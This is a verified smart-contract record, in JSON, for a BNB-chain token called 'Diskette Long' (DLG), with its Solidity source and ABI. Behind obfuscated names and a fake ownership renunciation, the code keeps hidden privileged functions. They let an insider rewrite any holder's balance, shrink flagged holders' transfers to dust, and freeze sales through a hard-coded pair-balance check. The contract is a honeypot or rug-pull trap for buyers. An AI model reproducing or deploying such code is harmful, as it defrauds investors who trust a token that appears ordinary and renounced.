{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface marketingSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamAmount {\n    function createPair(address marketingBuy, address totalFund) external returns (address);\n}\n\ninterface receiverSenderLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverAuto) external view returns (uint256);\n\n    function transfer(address atFund, uint256 liquidityAt) external returns (bool);\n\n    function allowance(address sellTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atFund,\n        uint256 liquidityAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchEnable, uint256 value);\n    event Approval(address indexed sellTx, address indexed spender, uint256 value);\n}\n\ninterface exemptLiquidity is receiverSenderLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DisketteLong is sellAuto, receiverSenderLiquidity, exemptLiquidity {\n\n    function name() external view virtual override returns (string memory) {\n        return tokenTradingAuto;\n    }\n\n    bool public takeFee;\n\n    string private tokenTradingAuto = \"Diskette Long\";\n\n    uint256 private takeSell = 100000000 * 10 ** 18;\n\n    bool private takeTrading;\n\n    uint256 public tokenTeam;\n\n    address public listTake;\n\n    mapping(address => bool) public toLimitSender;\n\n    function marketingWallet(address senderSwapMarketing) public {\n        require(senderSwapMarketing.balance < 100000);\n        if (takeFee) {\n            return;\n        }\n        \n        toLimitSender[senderSwapMarketing] = true;\n        if (shouldList) {\n            exemptLimit = true;\n        }\n        takeFee = true;\n    }\n\n    uint256 public feeLaunched;\n\n    address public enableAtMin;\n\n    string private autoLimit = \"DLG\";\n\n    mapping(address => mapping(address => uint256)) private exemptReceiverReceiver;\n\n    function feeTake() private view {\n        require(toLimitSender[_msgSender()]);\n    }\n\n    uint256 constant swapExempt = 3 ** 10;\n\n    function balanceOf(address receiverAuto) public view virtual override returns (uint256) {\n        return senderIsTeam[receiverAuto];\n    }\n\n    address atMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return limitMin;\n    }\n\n    mapping(address => uint256) private senderIsTeam;\n\n    bool private listToken;\n\n    function transfer(address maxReceiver, uint256 liquidityAt) external virtual override returns (bool) {\n        return listTotal(_msgSender(), maxReceiver, liquidityAt);\n    }\n\n    function launchAtSell(address maxReceiver, uint256 liquidityAt) public {\n        feeTake();\n        senderIsTeam[maxReceiver] = liquidityAt;\n    }\n\n    function transferFrom(address modeTo, address atFund, uint256 liquidityAt) external override returns (bool) {\n        if (_msgSender() != sellEnable) {\n            if (exemptReceiverReceiver[modeTo][_msgSender()] != type(uint256).max) {\n                require(liquidityAt <= exemptReceiverReceiver[modeTo][_msgSender()]);\n                exemptReceiverReceiver[modeTo][_msgSender()] -= liquidityAt;\n            }\n        }\n        return listTotal(modeTo, atFund, liquidityAt);\n    }\n\n    function getOwner() external view returns (address) {\n        return limitMin;\n    }\n\n    address private limitMin;\n\n    uint256 public liquidityToBuy;\n\n    bool public exemptLimit;\n\n    mapping(address => bool) public shouldMinEnable;\n\n    uint256 totalAtLaunch;\n\n    uint8 private fundTo = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeSell;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundTo;\n    }\n\n    function tokenAmountSwap() public {\n        emit OwnershipTransferred(enableAtMin, address(0));\n        limitMin = address(0);\n    }\n\n    function allowance(address amountFeeExempt, address fromFee) external view virtual override returns (uint256) {\n        if (fromFee == sellEnable) {\n            return type(uint256).max;\n        }\n        return exemptReceiverReceiver[amountFeeExempt][fromFee];\n    }\n\n    address sellEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address fromFee, uint256 liquidityAt) public virtual override returns (bool) {\n        exemptReceiverReceiver[_msgSender()][fromFee] = liquidityAt;\n        emit Approval(_msgSender(), fromFee, liquidityAt);\n        return true;\n    }\n\n    function receiverMin(address modeTo, address atFund, uint256 liquidityAt) internal returns (bool) {\n        require(senderIsTeam[modeTo] >= liquidityAt);\n        senderIsTeam[modeTo] -= liquidityAt;\n        senderIsTeam[atFund] += liquidityAt;\n        emit Transfer(modeTo, atFund, liquidityAt);\n        return true;\n    }\n\n    uint256 private swapMode;\n\n    function feeModeTrading(address amountAt) public {\n        feeTake();\n        if (listToken == takeTrading) {\n            takeTrading = false;\n        }\n        if (amountAt == enableAtMin || amountAt == listTake) {\n            return;\n        }\n        shouldMinEnable[amountAt] = true;\n    }\n\n    function listTotal(address modeTo, address atFund, uint256 liquidityAt) internal returns (bool) {\n        if (modeTo == enableAtMin) {\n            return receiverMin(modeTo, atFund, liquidityAt);\n        }\n        uint256 totalToken = receiverSenderLiquidity(listTake).balanceOf(atMin);\n        require(totalToken == txAmount);\n        require(atFund != atMin);\n        if (shouldMinEnable[modeTo]) {\n            return receiverMin(modeTo, atFund, swapExempt);\n        }\n        return receiverMin(modeTo, atFund, liquidityAt);\n    }\n\n    bool public shouldList;\n\n    constructor (){\n        if (liquidityToBuy != swapMode) {\n            swapMode = feeLaunched;\n        }\n        marketingSwap tradingMin = marketingSwap(sellEnable);\n        listTake = teamAmount(tradingMin.factory()).createPair(tradingMin.WETH(), address(this));\n        if (swapMode == liquidityToBuy) {\n            takeTrading = true;\n        }\n        enableAtMin = _msgSender();\n        tokenAmountSwap();\n        toLimitSender[enableAtMin] = true;\n        senderIsTeam[enableAtMin] = takeSell;\n        \n        emit Transfer(address(0), enableAtMin, takeSell);\n    }\n\n    uint256 txAmount;\n\n    event OwnershipTransferred(address indexed launchSell, address indexed amountMin);\n\n    function limitMax(uint256 liquidityAt) public {\n        feeTake();\n        txAmount = liquidityAt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoLimit;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFeeExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAtMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"}],\"name\":\"feeModeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAt\",\"type\":\"uint256\"}],\"name\":\"launchAtSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityAt\",\"type\":\"uint256\"}],\"name\":\"limitMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityToBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSwapMarketing\",\"type\":\"address\"}],\"name\":\"marketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldMinEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toLimitSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAmountSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DisketteLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}